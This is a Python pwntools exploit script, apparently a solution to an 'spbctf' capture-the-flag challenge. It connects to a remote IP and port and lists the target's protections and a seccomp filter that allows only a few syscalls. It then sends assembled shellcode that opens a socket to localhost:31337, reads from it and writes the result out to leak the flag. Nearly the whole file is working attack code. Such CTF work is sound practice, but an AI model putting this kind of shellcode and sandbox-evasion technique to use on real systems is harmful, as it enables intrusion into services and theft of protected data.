#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template ./local.elf --host 109.233.56.90 --port 11666
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./local.elf')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11666)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
#  0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
#  0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011
#  0007: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0011
#  0008: 0x15 0x02 0x00 0x00000029  if (A == socket) goto 0011
#  0009: 0x15 0x01 0x00 0x0000002a  if (A == connect) goto 0011
#  0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
#  0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0012: 0x06 0x00 0x00 0x00000000  return KILL

io = start()

shellcode = shellcraft.connect('localhost',31337)

_read = """
    mov rdi, rbp
    lea rsi, [rip + need_buf]
    mov rdx, 40
    mov rax, 0
    syscall
"""

_write = """
    mov edi, 1
    mov rax, 1
    syscall
need_buf:
"""

pl = asm(shellcode + _read + _write)

io.sendline(pl)

io.recvuntil("spbctf")
flag = io.recvuntil(b"}").decode()
log.success(f"Flag: spbctf{flag}")

io.close()